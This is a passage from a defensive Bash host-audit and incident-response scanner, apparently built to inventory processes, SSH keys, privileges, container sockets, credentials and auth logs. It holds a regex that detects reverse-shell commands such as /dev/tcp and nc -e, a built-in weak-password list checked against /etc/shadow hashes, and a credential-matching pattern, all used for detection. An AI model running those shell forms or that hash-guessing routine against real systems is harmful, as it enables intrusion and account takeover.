        printf 'Artifact hashes and collection truncation are recorded in manifest.tsv.\n\n'
        ir_section "$dir" 'Processes they ran' 'PROC AUTH_EVENT'
        ir_section "$dir" 'IP addresses of intruders' 'CONNECTION LISTEN AUTH_EVENT'
        ir_section "$dir" 'User accounts they used' 'USER SSHKEY SHADOW_META SUDOERS AUTH_EVENT'
        ir_section "$dir" 'Active sessions hijacked' 'SESSION SESSION_SOCKET'
        printf '## UTC timeline\n\nCollection time is recorded in META; event timestamps remain in source logs.\n\n'
        printf '| UTC time | Evidence ID | File mtime (unverified event time) |\n|---|---|---|\n'
        local evidence path epoch timestamp
        while IFS=$'\t' read -r evidence path epoch; do
            [[ $epoch =~ ^[0-9]+$ ]] || continue
            timestamp=$(date -u -d "@$epoch" '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null) || continue
            printf '| %s | records.tsv:L%s | %s |\n' "$timestamp" "$evidence" "$path"
        done < <(awk -F '\t' '$1=="OBS" && $2=="FILE" && ++n<=50 {split($4,a,":"); p=$3; gsub(/[|<>`\[\]]/,"?",p); printf "%d\t%s\t%s\n",NR,p,a[5]}' "$dir/records.tsv")
        printf '\nFilesystem times can be altered. Authentication timestamps remain in their original timezone in AUTH_EVENT records; correlate before attributing an incident.\n\n' 
        printf '## Findings\n\n'
        awk -F '\t' '$1=="FIND" {s=$6; p=$7; gsub(/[<>`]/,"",s); gsub(/[<>`]/,"",p); printf "- **%s %s**: %s (%s)\n",$3,$2,s,p}' "$dir/records.tsv"
    } > "$dir/report.md"
}

write_remediation() {
    local records=$1 target=$2
    {
        printf '#!/usr/bin/env bash\n# Suggested review steps only. No commands execute.\n'
        printf '# Review service dependencies and preserve evidence before any change.\n'
        printf '# Never disable Wazuh/osquery/auditd/Falco/Velociraptor based on this file.\n'
        awk -F '\t' "$REMEDIATE_PROG" "$records"
    } > "$target"
}

# Single pass: learn which services are ACTUALLY listening, buffer the
# findings, then emit at END. A constant "could disrupt everything" banner is
# worse than none - it trains the operator to ignore the one line that protects
# uptime. Single-pass (rather than reading the file twice) keeps this testable
# from a pipe. mawk-safe: no gensub/asort/ENDFILE.
read -r -d '' REMEDIATE_PROG <<'AWKEOF' || true
        BEGIN {
            P["22"]="ssh"; P["2222"]="ssh"
            P["25"]="smtp"; P["465"]="smtp"; P["587"]="smtp"
            P["53"]="dns"
            P["80"]="http"; P["443"]="http"; P["8080"]="http"; P["8443"]="http"
            P["21"]="ftp"; P["3632"]="distcc"; P["502"]="modbus"
            P["3306"]="mysql"; P["5432"]="postgres"
            P["5900"]="vnc"; P["5901"]="vnc"; P["5902"]="vnc"
            P["445"]="smb"; P["139"]="smb"; P["2049"]="nfs"; P["111"]="nfs"
            P["389"]="ldap"; P["636"]="ldap"; P["6379"]="redis"
            P["27017"]="mongodb"; P["161"]="snmp"; P["1883"]="mqtt"
            P["9200"]="elasticsearch"; P["873"]="rsync"
        }
        function svc_for(id, fix) {
            if (id ~ /^SSH/ || fix ~ /ssh|authkey/) return "ssh"
            if (id ~ /^WEB/ || fix == "inspect_webshell") return "http"
            if (id ~ /^SQL/) return "mysql"
            if (id ~ /^DNS/) return "dns"
            if (id ~ /^SMTP/) return "smtp"
            if (id ~ /^FTP/) return "ftp"
            if (id ~ /^VNC/) return "vnc"
            if (id ~ /^SMB/) return "smb"
            if (id ~ /^NFS/) return "nfs"
            return ""
        }
        $1 == "OBS" && $2 == "LISTEN" {
            n = split($3, a, ":"); port = a[n]
            if (port in P) LIVE[P[port]] = port
            next
        }
        $1=="FIND" && $3!="INFO" {
            key=$9 SUBSEP $7; if(seen[key]++) next
            title=$6; target=$7; gsub(/[\r\n]/," ",title); gsub(/[\r\n]/," ",target)
            nb++
            B_id[nb]=$2; B_sev[nb]=$3; B_title[nb]=title; B_target[nb]=target; B_fix[nb]=$9
        }
        END {
            for (i = 1; i <= nb; i++) {
                fix = B_fix[i]
                print "\n# " B_id[i] " " B_sev[i] ": " B_title[i]
                print "# Target: " B_target[i]
                svc = svc_for(B_id[i], fix)
                if (svc == "")
                    print "# Service impact: not tied to a listening service; review local dependencies."
                else if (svc in LIVE)
                    print "# COULD DISRUPT " toupper(svc) " - observed listening on port " LIVE[svc] ". Verify before changing."
                else
                    print "# No " svc " listener observed on this host; service impact unlikely."
                print "# AVAILABILITY RISK: verify ownership and dependencies before changes."
                if (fix=="fix_perms" || fix=="rm_suid") print "# Review owner/group and required access; remove only unjustified write or set-ID bits."
                else if (fix=="capture_memory") print "# Preserve VM snapshot/memory using trusted external tooling; do not reboot yet."
                else if (fix ~ /ssh|authkey/) print "# Preserve a working console session, review the exact key/directive, then validate sshd configuration before reload."
                else if (fix=="inspect_webshell") print "# Preserve file and hash; compare with trusted application source before quarantining."
                else print "# Compare with a trusted baseline; apply the smallest reviewed change."
            }
        }
AWKEOF

chk_extra_procs() {
    (( CAP_PROC == 1 )) || { skip PRC010 "no live process table"; return; }
    local pid cmd ppid exe a agent
    for pid in "${PROC_PIDS[@]}"; do
        cmd=${PROC_CMD[$pid]:-}; ppid=${PROC_PPID[$pid]:-}; exe=${PROC_EXE[$pid]:-}
        agent=0
        while IFS= read -r a; do [[ ${PROC_COMM[$pid]:-} == "${a:0:15}" ]] && agent=1; done <<< "$SIG_AGENT"
        (( agent )) && continue
        # Command lines are observations, not commands. Avoid scanning our own
        # interpreter invocation and test payloads passed to scanner subprocesses.
        local ancestor=$pid depth=0
        while [[ -n $ancestor && $ancestor != 0 ]] && (( depth < 64 )); do
            [[ $ancestor == "$$" || $ancestor == "$BASHPID" ]] && break
            ancestor=${PROC_PPID[$ancestor]:-}; depth=$((depth+1))
        done
        [[ $ancestor == "$$" || $ancestor == "$BASHPID" ]] && continue
        if [[ $cmd =~ /dev/tcp/|nc[[:space:]]+-[a-z]*e[[:space:]]|ncat.*--exec|bash[[:space:]]+-i.*\>\& ]]; then
            finding PRC010 CRIT procs likely "Reverse-shell-like process command" "pid=$pid" "$cmd" capture_memory
        fi
        if [[ ${PROC_COMM[$pid]:-} == \[*\] && $ppid != 2 && -n $exe ]]; then
            finding PRC011 HIGH procs possible "Userspace executable masquerades as a bracketed kernel thread" "pid=$pid" "ppid=$ppid exe=$exe" inspect_proc
        fi
        if [[ -r $PROCFS/$pid/environ && $CAP_ROOT == 1 ]]; then
            local e
            while IFS= read -r -d '' e; do
                case $e in LD_PRELOAD=?*|LD_AUDIT=?*)
                    finding PRC012 HIGH persistence possible "Dynamic loader injection variable in process" "pid=$pid" "$e" review_loader ;;
                esac
            done < "$PROCFS/$pid/environ"
        fi
    done
    ok PRC010 "process commands, masquerading and loader environment inspected"
}

chk_sessions() {
    (( CAP_PROC == 1 )) || { skip SES000 "live sessions unavailable offline"; return; }
    local pid st rest state ppid pgrp session tty tail
    for pid in "${PROC_PIDS[@]}"; do
        [[ -r $PROCFS/$pid/stat ]] || continue
        read -r st < "$PROCFS/$pid/stat" || continue
        rest=${st##*") "}
        read -r state ppid pgrp session tty tail <<< "$rest"
        [[ $tty =~ ^-?[0-9]+$ && $tty != 0 ]] || continue
        obs SESSION "$pid" "session=$session tty=$tty ppid=$ppid exe=${PROC_EXE[$pid]:-} cmd=${PROC_CMD[$pid]:-}"
    done
    ok SES000 "controlling-terminal sessions inventoried from /proc; not proof of hijacking"
}

chk_capabilities() {
    local i line start=$SECONDS rc n=0
    local -a batch=()
    have getcap || { skip CAP001 "getcap unavailable; file capabilities unknown"; }
    have lsattr || { skip CAP002 "lsattr unavailable; immutable attributes unknown"; }
    for ((i=0; i<${#FILES[@]}; i+=128)); do
        (( SECONDS-start < STAGE_SECONDS )) || { skip CAP000 "capability/attribute budget exceeded"; break; }
        batch=("${FILES[@]:i:128}")
        if have getcap; then
            while IFS= read -r line; do
                case $line in
                    @STATUS:*) [[ $line == @STATUS:0 ]] || skip CAP001 "getcap batch failed or timed out" ;;
                    *cap_setuid*|*cap_setgid*|*cap_sys_admin*|*cap_dac_override*|*cap_sys_ptrace*)
                        finding CAP001 HIGH integrity untrusted-source "File has powerful Linux capabilities" "${line%% *}" "$line" review_capabilities ;;
                    ?*) obs CAPABILITY "${line%% *}" "${line#* }" ;;
                esac
            done < <(run_bounded 5 getcap "${batch[@]}"; printf '@STATUS:%s\n' "$?")
        fi
        if have lsattr; then
            while IFS= read -r line; do
                local attrs path
                read -r attrs path <<< "$line"
                [[ $attrs == *i* && $attrs != *:* ]] || continue
                finding CAP002 MED integrity untrusted-source "Immutable file attribute" "$path" "$attrs; may be intentional hardening" review_attributes
            done < <(run_bounded 5 lsattr -d -- "${batch[@]}")
        fi
        n=$((n+${#batch[@]}))
    done
    ok CAP000 "$n candidate files checked for optional extended attributes"
}

chk_weak_passwords() {
    (( OPT_WEAK )) || { ok PWD000 "weak-password candidate audit not requested"; return; }
    [[ -r $ROOT/etc/shadow ]] || { skip PWD000 "shadow unreadable; password audit requires root or readable offline evidence"; return; }
    local -a candidates=(password Password1 Password123 'Passw0rd123!' admin root toor changeme welcome letmein)
    local word
    if [[ -n $OPT_WEAK_FILE ]]; then
        while IFS= read -r word || [[ -n $word ]]; do
            [[ -n $word ]] && candidates+=("$word")
            (( ${#candidates[@]} <= 64 )) || { skip PWD001 "candidate file capped at 64 entries"; break; }
        done < "$OPT_WEAK_FILE"
    fi
    local user hash rest alg salt candidate computed n=0 start=$SECONDS hit
    have openssl || { skip PWD000 "openssl passwd unavailable; no supported hash backend"; return; }
    while IFS=: read -r user hash rest; do
        case $hash in '!'*|'*'*|'') continue ;; esac
        (( SECONDS-start < 60 )) || { skip PWD000 "password audit budget exceeded"; break; }
        n=$((n+1)); (( n <= 64 )) || { skip PWD000 "password audit capped at 64 accounts"; break; }
        case $hash in '$6$'*) alg=-6 ;; '$5$'*) alg=-5 ;; '$1$'*) alg=-1 ;;
            *) skip PWD002 "unsupported hash format for $user (including yescrypt/bcrypt); password strength UNKNOWN"; continue ;;
        esac
        salt=${hash#\$?\$}; salt=${salt%%\$*}
        [[ $salt != rounds=* ]] || { skip PWD002 "custom-round hash for $user unsupported by openssl backend"; continue; }
        hit=0
        for candidate in "${candidates[@]}"; do
            (( SECONDS-start < 60 )) || break
            computed=$(printf '%s\n' "$candidate" | run_bounded 2 openssl passwd "$alg" -salt "$salt" -stdin)
            if [[ $? != 0 ]]; then skip PWD002 "openssl does not support requested hash for $user"; break; fi
            if [[ $computed == "$hash" ]]; then
                finding PWD001 CRIT accounts confirmed "Password matches an embedded or supplied weak candidate" "$user" "candidate and hash withheld" change_password
                hit=1; break
            fi
        done
        obs PASSWORD_AUDIT "$user" "candidate_match=$hit"
    done < "$ROOT/etc/shadow"
    ok PWD000 "$n accounts attempted; candidate-only audit is not a strength proof"
}

selftest_lint() (
    local failures=0 source=${BASH_SOURCE[0]}
    bash -n "$source" || failures=$((failures+1))
    # Check only actual awk program contents; names in prose are harmless.
    printf '%s\n' "$RULES_PROG" "$RENDER_PROG" "$CONFIG_RULES" "$WEBSHELL_PROG" "$SNAPSHOT_PROG" "$DIFF_PROG" "$JSON_PROG" |
        awk '/(^|[^[:alnum:]_])(gensub|strtonum|asort|asorti)[ \t]*\(|ENDFILE|BEGINFILE/ {bad=1} END{exit bad}' || failures=$((failures+1))
    LC_ALL=C awk '/[^\t\r\040-\176]/ {print "Non-ASCII source line " NR; bad=1} END {exit bad}' "$source" || failures=$((failures+1))
    printf 'Lint: %d failures; shellcheck and distro integration are separate checks.\n' "$failures"
    (( failures == 0 )) || return 4
)


parse_proc_stat() {
    local st=$1 tail head
    head=${st#*(}; PARSED_COMM=${head%") "*}; tail=${st##*") "}
    read -r PARSED_STATE PARSED_PPID PARSED_PGRP PARSED_SESSION PARSED_TTY _ <<< "$tail"
    [[ $PARSED_PPID =~ ^[0-9]+$ && $PARSED_TTY =~ ^-?[0-9]+$ ]]
}

discover_webroots() {
    local -a configs=()
    local f path n=0
    for f in "$ROOT"/etc/nginx/nginx.conf "$ROOT"/etc/nginx/conf.d/* "$ROOT"/etc/nginx/sites-enabled/* "$ROOT"/etc/nginx/sites-available/* \
             "$ROOT"/etc/apache2/sites-enabled/* "$ROOT"/etc/apache2/sites-available/* \
             "$ROOT"/etc/httpd/conf/httpd.conf "$ROOT"/etc/httpd/conf.d/*; do
        [[ -f $f && -r $f && ! -L $f ]] && configs+=("$f")
    done
    (( ${#configs[@]} )) || return 0
    while IFS= read -r path; do
        [[ $path == /* && $path != *[[:cntrl:]]* && $path != *'$'* ]] || continue
        [[ -d $ROOT$path && ! -L $ROOT$path ]] || continue
        n=$((n+1)); (( n <= 32 )) || { skip WEB010 "webroot discovery capped at 32 paths"; break; }
        DISCOVERED_ROOTS+=("$ROOT$path")
        obs WEBROOT "$path" config-discovery
    done < <(run_bounded 5 awk '
        /^[ \t]*#/ {next}
        tolower($1)=="root" || tolower($1)=="alias" || tolower($1)=="documentroot" {
            p=$0; sub(/^[ \t]*[^ \t]+[ \t]+/,"",p); sub(/[;#].*$/,"",p)
            gsub(/^[ \t\042]+|[ \t\042]+$/,"",p); if(!seen[p]++) print p
        }' "${configs[@]}")
}

chk_artifacts() {
    local path f line u h rest n=0
    while IFS= read -r path; do
        [[ -e $ROOT$path ]] || continue
        finding ART001 HIGH rootkit possible "Known rootkit artifact path exists" "$path" "literal path match; verify ownership and provenance" inspect_file
        n=$((n+1))
    done <<< "$SIG_RK_PATH"
    for f in "$ROOT"/etc/systemd/system-generators/* "$ROOT"/usr/local/lib/systemd/system-generators/* \
             "$ROOT"/etc/systemd/user-generators/* "$ROOT"/etc/NetworkManager/dispatcher.d/*; do
        [[ -f $f ]] || continue
        finding ART002 MED persistence possible "Local generator or network dispatcher hook" "$f" "automatically executed by service manager" review_persistence
    done
    if [[ -r $ROOT/etc/passwd ]]; then
        while IFS=: read -r u _ _ _ _ h rest; do
            [[ $h == /* ]] || continue
            for path in .forward .ssh/environment .config/autostart; do
                f="$ROOT$h/$path"
                [[ -e $f ]] || continue
                finding ART003 MED persistence possible "User mail, SSH environment or desktop startup artifact" "$f" "owner=$u" review_persistence
            done
        done < "$ROOT/etc/passwd"
    fi
    for f in "$ROOT/etc/hosts" "$ROOT/etc/resolv.conf" "$ROOT/etc/nsswitch.conf"; do
        [[ -r $f ]] || continue
        while IFS= read -r line || [[ -n $line ]]; do
            [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
            obs RESOLVER "$f" "$line"
        done < "$f"
    done
    ok ART000 "$n literal artifact matches; startup and resolver inventory completed"
}

chk_agent_enrollment() {
    local f state=unknown
    for f in "$ROOT/var/ossec/etc/client.keys" "$ROOT/var/ossec/etc/ossec.conf" \
             "$ROOT/etc/osquery/osquery.flags" "$ROOT/etc/velociraptor/client.config.yaml"; do
        [[ -e $f ]] || continue
        if [[ ! -r $f ]]; then skip AGT010 "cannot inspect enrollment metadata: $f";
        elif [[ ! -s $f ]]; then finding AGT010 HIGH agents possible "Empty security-agent enrollment/configuration file" "$f" "credentials withheld; verify enrollment with manager" protect_agent;
        else obs AGENT_CONFIG "$f" present-nonempty; fi
    done
    for f in "$ROOT/var/ossec/var/run/wazuh-agentd.state" "$ROOT/var/ossec/var/run/ossec-agentd.state"; do
        [[ -r $f ]] || continue
        local line
        while IFS= read -r line; do
            case $line in status=*) state=${line#status=}; obs AGENT_CONNECTION wazuh "$state" ;; esac
        done < "$f"
        [[ $state == *disconnected* || $state == *pending* ]] && finding AGT011 HIGH agents possible "Security agent reports disconnected or pending enrollment" wazuh "$state; protect agent and check manager connectivity" protect_agent
    done
    ok AGT010 "local enrollment metadata checked; server-side enrollment is not queried"
}


chk_ssh_locations() {
    local -a configs=() paths=()
    local f line key values template u uid h shell path keyline digest n=0
    for f in "$ROOT/etc/ssh/sshd_config" "$ROOT"/etc/ssh/sshd_config.d/*.conf; do
        [[ -r $f && -f $f ]] && configs+=("$f")
    done
    for f in "${configs[@]}"; do
        while IFS= read -r line || [[ -n $line ]]; do
            read -r key values <<< "$line"
            case ${key,,} in authorizedkeysfile)
                read -r -a paths <<< "$values"
                for template in "${paths[@]}"; do
                    case $template in none|.ssh/authorized_keys|.ssh/authorized_keys2|%h/.ssh/authorized_keys) continue ;; esac
                    [[ -r $ROOT/etc/passwd ]] || { skip SSH030 "cannot resolve custom key paths without passwd"; continue; }
                    while IFS=: read -r u _ uid _ _ h shell; do
                        [[ $h == /* ]] || continue
                        path=${template//%u/$u}; path=${path//%U/$uid}; path=${path//%h/$h}
                        path=${path//\"/}
                        case $path in *%*|*\**|*\?*) skip SSH030 "unresolved token/glob in AuthorizedKeysFile: $template"; continue ;; esac
                        [[ $path == /* ]] || path="$h/$path"
                        [[ -f $ROOT$path ]] || continue
                        [[ -r $ROOT$path ]] || { skip SSH030 "custom key file unreadable: $path"; continue; }
                        while IFS= read -r keyline || [[ -n $keyline ]]; do
                            [[ $keyline =~ ^[[:space:]]*(#|$) ]] && continue
                            digest=$(printf '%s' "$keyline" | hash_stream)
                            [[ -n $digest ]] || { skip SSH030 "cannot fingerprint custom SSH key"; continue; }
                            obs SSHKEY "$u:$path:${keyline##* }" "$digest"
                            [[ $keyline == *command=* ]] && finding SSH031 HIGH ssh possible "Forced command in alternate SSH key file" "$path" "$keyline" review_authkeys
                            n=$((n+1))
                        done < "$ROOT$path"
                    done < "$ROOT/etc/passwd"
                done ;;
                include)
                    # Standard drop-ins are scanned; other include graphs need
                    # sshd's full Match/Include interpretation on trusted tooling.
                    case $values in /etc/ssh/sshd_config.d/\*.conf|sshd_config.d/\*.conf) ;;
                        *) skip SSH032 "nonstandard SSH Include needs review: $values" ;;
                    esac ;;
            esac
        done < "$f"
    done
    ok SSH030 "$n alternate AuthorizedKeysFile entries inspected; Match scopes are static"
}


chk_privilege_paths() {
    local f line name members uid gid hash days min max warn_days inactive expiry rest value mode bits path
    if [[ -r $ROOT/etc/group ]]; then
        while IFS=: read -r name _ gid members; do
            obs GROUP "$name" "$gid:$members"
            case $name in sudo|wheel|admin|docker|lxd|incus|disk|shadow|libvirt|kvm)
                [[ -z $members ]] || finding PRIV001 MED accounts possible "Membership in a privileged or sensitive group" "$name" "members=$members; review business need" review_groups ;;
            esac
        done < "$ROOT/etc/group"
    fi
    if [[ -r $ROOT/etc/shadow ]]; then
        while IFS=: read -r name hash days min max warn_days inactive expiry rest; do
            case $hash in '!'*|'*'*) value=locked ;; '') value=empty ;; *) value=set ;; esac
            obs SHADOW_META "$name" "state=$value changed_days=$days max_days=$max expiry_days=$expiry"
        done < "$ROOT/etc/shadow"
    fi
    for f in "$ROOT/etc/doas.conf" "$ROOT/usr/local/etc/doas.conf" "$ROOT/etc/sudoers" "$ROOT"/etc/sudoers.d/* \
             "$ROOT"/etc/polkit-1/rules.d/* "$ROOT"/etc/polkit-1/localauthority/*.d/* \
             "$ROOT"/usr/share/polkit-1/rules.d/* "$ROOT"/etc/dbus-1/system.d/* \
             "$ROOT"/etc/ld.so.conf "$ROOT"/etc/ld.so.conf.d/* "$ROOT"/etc/security/capability.conf; do
        [[ -f $f ]] || continue
        [[ -r $f ]] || { skip PRIV002 "privilege configuration unreadable: $f"; continue; }
        logical_path "$f"
        while IFS= read -r line || [[ -n $line ]]; do
            [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
            obs PRIVCFG "$LOGICAL" "$line"
            case $LOGICAL in /etc/ld.so.conf|/etc/ld.so.conf.d/*)
                path=${line%%#*}
                [[ $path == /* && -d $ROOT$path ]] || continue
                mode=$(stat -c %a -- "$ROOT$path" 2>/dev/null) || continue
                bits=$((8#$mode))
                (( (bits & 0002) == 0 )) || finding PRIV003 HIGH persistence untrusted-source "World-writable dynamic loader search directory" "$path" "mode=$mode" fix_perms ;;
            esac
        done < "$f"
    done
    if [[ -z $ROOT ]]; then
        local -a pathdirs=()
        IFS=: read -r -a pathdirs <<< "$ORIGINAL_PATH:"
        for path in "${pathdirs[@]}"; do
            if [[ -z $path || $path != /* ]]; then
                finding PRIV004 HIGH hardening confirmed "Original PATH includes current or relative directory" "${path:-<empty>}" "the scanner uses its own fixed PATH" review_path
            elif [[ -d $path ]]; then
                mode=$(stat -c %a -- "$path" 2>/dev/null) || continue
                bits=$((8#$mode))
                (( (bits & 0002) == 0 )) || finding PRIV004 HIGH hardening untrusted-source "Original PATH includes world-writable directory" "$path" "mode=$mode" review_path
            fi
        done
    fi
    ok PRIV000 "sudo/doas/polkit/D-Bus/loader configuration and sensitive groups inspected"
}

chk_container_surface() {
    local f line pid key val n=0 mode bits
    for f in "$ROOT/run/docker.sock" "$ROOT/var/run/docker.sock" "$ROOT/run/containerd/containerd.sock" \
             "$ROOT/var/run/crio/crio.sock" "$ROOT/var/lib/lxd/unix.socket" "$ROOT/var/lib/incus/unix.socket" \
             "$ROOT/run/podman/podman.sock" "$ROOT/run/user"/*/podman/podman.sock; do
        [[ -S $f ]] || continue
        mode=$(stat -c %a -- "$f" 2>/dev/null) || continue
        bits=$((8#$mode)); obs CONTROL_SOCKET "$f" "$mode"
        if (( (bits & 0002) != 0 )); then
            finding CTR001 CRIT containers untrusted-source "World-writable container control socket" "$f" "mode=$mode; access may grant host control" review_container
        else finding CTR002 INFO containers untrusted-source "Container control socket exists" "$f" "mode=$mode; review owner/group and mounted exposure" review_container; fi
        n=$((n+1))
    done
    for f in "$ROOT/var/run/secrets/kubernetes.io/serviceaccount/token" "$ROOT/run/secrets/kubernetes.io/serviceaccount/token" \
             "$ROOT/etc/kubernetes/admin.conf" "$ROOT/etc/kubernetes/kubelet.conf"; do
        [[ -f $f ]] || continue
        finding CTR003 INFO containers confirmed "Kubernetes credential material present" "$f" "content withheld; review permissions, scope and host mounts" review_container
    done
    if (( CAP_PROC )); then
        for pid in "${PROC_PIDS[@]}"; do
            [[ -r $PROCFS/$pid/status ]] || continue
            local effective='' ambient='' seccomp='' nonew='' uid=''
            while read -r key val; do
                case $key in CapEff:) effective=$val ;; CapAmb:) ambient=$val ;; Seccomp:) seccomp=$val ;; NoNewPrivs:) nonew=$val ;; Uid:) uid=${val%%[[:space:]]*} ;; esac
            done < "$PROCFS/$pid/status"
            obs PROCESS_SECURITY "$pid" "uid=$uid CapEff=$effective CapAmb=$ambient Seccomp=$seccomp NoNewPrivs=$nonew"
            if [[ -n $effective && $effective != 0000000000000000 && $uid != 0 && -n $uid ]]; then
                finding CTR004 MED hardening possible "Non-root process holds effective capabilities" "pid=$pid" "CapEff=$effective exe=${PROC_EXE[$pid]:-}; may be intentional" review_capabilities
            fi
        done
    fi
    ok CTR000 "$n runtime sockets inspected; no container commands or cloud metadata requests"
}

chk_acl() {
    have getfacl || { skip ACL000 "getfacl unavailable; extended ACL permissions unknown"; return; }
    local i line file='' n=0 rc
    for ((i=0;i<${#FILES[@]};i+=128)); do
        while IFS= read -r line; do
            case $line in
                @STATUS:*) [[ $line == @STATUS:0 ]] || skip ACL000 "ACL enumeration failed or timed out" ;;
                '# file: '*) file=${line#\# file: } ;;
                user:?*:*w*|group:?*:*w*|default:user:?*:*w*|default:group:?*:*w*)
                    finding ACL001 MED integrity untrusted-source "Named ACL grants write access" "$file" "$line; effective access is limited by the ACL mask" review_acl
                    n=$((n+1)) ;;
            esac
        done < <(run_bounded 5 getfacl -p -s -- "${FILES[@]:i:128}"; printf '@STATUS:%s\n' "$?")
    done
    ok ACL000 "$n named write ACL entries observed"
}

read -r -d '' SECRET_PROG <<'AWKEOF' || true
BEGIN {OFS="\t"}
FNR==1 {count=0}
{
    if(count>=5) next
    s=tolower($0)
    if(s ~ /^[ \t]*(#|;|\/\/)/) next
    if(s ~ /-----begin ([a-z0-9 ]+ )?private key-----/) {
        print "FIND","SEC010","INFO","credentials","possible","Private key material present",FILENAME,"line=" FNR "; content withheld","review_credentials"
        count++
    } else if(s ~ /(password|passwd|api[_-]?key|secret[_-]?key|access[_-]?token|client[_-]?secret)[a-z0-9_\042\047 ]*[=:][ \t]*[^ \t#;]/ && s !~ /example|placeholder|your_password|changeme_here|getenv|environ|passwordauthentication/) {
        print "FIND","SEC011","LOW","credentials","possible","Potential stored credential assignment",FILENAME,"line=" FNR "; value withheld; verify whether placeholder or secret","review_credentials"
        count++
    }
}
AWKEOF

chk_stored_credentials() {
    local -a candidates=()
    local f size
    for f in "${FILES[@]}"; do
        [[ -r $f && ! -L $f ]] || continue
        case ${f,,} in
            *.conf|*.cfg|*.ini|*.json|*.yaml|*.yml|*.xml|*.properties|*.tfstate|*.tf|*.php|*.pem|*.key|*/.env*|*/.netrc|*/.pgpass|*/.git-credentials|*/.boto|*/.pypirc|*/credentials|*/config|*/id_rsa|*/id_ed25519) ;;
            *) continue ;;
        esac
        size=${FILE_SIZES[$f]:-2097152}
        (( size < 2097152 )) && candidates+=("$f")
    done
    if (( ${#candidates[@]} )); then
        run_bounded 30 awk "$SECRET_PROG" "${candidates[@]}" || skip SEC000 "credential-pattern scan incomplete"
    fi
    ok SEC000 "${#candidates[@]} text candidates inspected; credential values are not printed by this check"
}

chk_package_inventory() {
    [[ -z $ROOT ]] || { skip PKG010 "offline package inventory is not queried with host tools"; return; }
    local -a command=()
    local name version rc
    if have dpkg-query; then command=(dpkg-query -W '-f=${binary:Package}\t${Version}\n');
    elif have rpm; then command=(rpm -qa --qf '%{NAME}\t%{VERSION}-%{RELEASE}\n');
    else skip PKG010 "dpkg-query/rpm unavailable; package inventory unknown"; return; fi
    while IFS=$'\t' read -r name version; do
        case $name in @STATUS:*) [[ $name == @STATUS:0 ]] || skip PKG010 "package inventory failed" ;; *) obs PKG "$name" "$version" ;; esac
    done < <(run_bounded 10 "${command[@]}"; printf '@STATUS:%s\n' "$?")
    ok PKG010 "package versions inventoried; no unsupported CVE inference from upstream version alone"
}


chk_host_inventory() {
    local f key value line n=0
    for f in "$PROCFS/uptime" "$PROCFS/loadavg" "$PROCFS/meminfo" "$PROCFS/version" \
             "$PROCFS/net/route" "$PROCFS/net/ipv6_route" "$PROCFS/net/arp" \
             "$ROOT/etc/fstab" "$ROOT/etc/crypttab" "$ROOT/etc/login.defs" \
             "$ROOT/etc/security/pwquality.conf" "$ROOT/etc/security/limits.conf"; do
        [[ -r $f ]] || continue
        logical_path "$f"
        while IFS= read -r line || [[ -n $line ]]; do
            [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
            # fstab may contain embedded share passwords. Keep a redacted
            # marker in ordinary output; the file fingerprint detects drift.
            case ${line,,} in *password=*|*passwd=*|*pass=*) line='credential-bearing mount entry (value withheld)' ;; esac
            obs HOSTINFO "$LOGICAL" "$line"
            n=$((n+1))
        done < "$f"
    done
    if [[ -r $PROCFS/stat ]]; then
        while read -r key value; do
            [[ $key == btime ]] && { obs BOOT epoch "$value"; break; }
        done < "$PROCFS/stat"
    fi
    if [[ -z $ROOT ]] && have df; then
        local output
        output=$(run_bounded 5 df -lP 2>/dev/null)
        if [[ $? == 0 ]]; then obs DISK local "$output"; else skip HOST001 "local disk usage unavailable"; fi
    fi
    ok HOST000 "$n host, route, neighbor and account-policy records inventoried"
}

chk_process_mappings() {
    (( CAP_PROC )) || { skip MAP000 "process mappings unavailable offline"; return; }
    local pid perms range offset device inode path a protected count=0
    for pid in "${PROC_PIDS[@]}"; do
        [[ -r $PROCFS/$pid/maps ]] || continue
        protected=0
        while IFS= read -r a; do [[ ${PROC_COMM[$pid]:-} == "${a:0:15}" ]] && protected=1; done <<< "$SIG_AGENT"
        (( protected )) && continue
        while read -r range perms offset device inode path; do
            [[ $perms == *x* ]] || continue
            case $path in
                *memfd:*|*' (deleted)'*)
                    finding MAP001 MED procs possible "Executable deleted or memfd-backed mapping" "pid=$pid" "$perms $path; JITs and upgrades can be legitimate" inspect_proc
                    count=$((count+1)) ;;
                /tmp/*|/var/tmp/*|/dev/shm/*)
                    finding MAP002 HIGH procs possible "Executable mapping from a temporary directory" "pid=$pid" "$perms $path" inspect_proc
                    count=$((count+1)) ;;
            esac
            (( count < MAX_PER_CAT )) || { skip MAP000 "mapping findings capped; truncated=1"; return; }
        done < "$PROCFS/$pid/maps"
    done
    ok MAP000 "$count unusual executable mappings; no process memory copied"
}

chk_session_sockets() {
    local f mode bits n=0
    for f in "$ROOT"/tmp/tmux-*/* "$ROOT"/tmp/ssh-*/* "$ROOT"/run/screen/*/* \
             "$ROOT"/run/user/*/gnupg/S.gpg-agent* "$ROOT"/run/user/*/keyring/ssh \
             "$ROOT"/home/*/.ssh/* "$ROOT"/root/.ssh/*; do
        [[ -S $f ]] || continue
        mode=$(stat -c %a -- "$f" 2>/dev/null) || continue
        bits=$((8#$mode)); obs SESSION_SOCKET "$f" "mode=$mode"
        (( (bits & 0002) == 0 )) || finding SES010 HIGH sessions untrusted-source "World-writable session or authentication-agent socket" "$f" "mode=$mode; directory permissions may restrict reachability" review_sessions
        n=$((n+1))
    done
    ok SES010 "$n session/SSH/GPG socket paths inventoried; sockets were not contacted"
}


chk_auth_events() {
    local f line n=0 index
    for f in "$ROOT/var/log/auth.log" "$ROOT/var/log/secure" "$ROOT/var/log/audit/audit.log"; do
        [[ -f $f && -r $f ]] || continue
        index=0
        while IFS= read -r line; do
            index=$((index+1))
            case $line in
                *'Accepted '*|*'Failed password'*|*'Invalid user'*|*'session opened'*|*'session closed'*|*'COMMAND='*|*'type=EXECVE'*|*'type=USER_AUTH'*)
                    logical_path "$f"; obs AUTH_EVENT "$LOGICAL:tail-line=$index" "$line"
                    n=$((n+1)) ;;
            esac
            (( n < 200 )) || { skip LOG020 "authentication event output capped at 200; truncated=1"; return; }
        done < <(run_bounded 5 tail -n 2000 -- "$f")
    done
    ok LOG020 "$n authentication/command records from the last 2000 lines of available text logs"
}

ir_section() {
    local dir=$1 heading=$2 types=$3
    printf '## %s\n\n' "$heading"
    printf '| Evidence ID | Record | Target | Observation |\n|---|---|---|---|\n'
